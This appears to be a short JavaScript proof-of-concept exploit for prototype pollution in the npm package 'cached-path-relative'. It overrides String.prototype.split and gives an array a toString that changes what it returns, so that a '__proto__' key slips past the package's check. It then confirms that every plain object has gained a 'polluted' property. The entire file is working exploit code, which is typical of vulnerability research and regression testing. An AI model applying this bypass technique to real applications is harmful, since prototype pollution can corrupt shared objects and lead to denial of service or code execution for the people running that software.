var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
var relative = require('cached-path-relative');
relative('constructor', 'prototype', 'polluted');
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}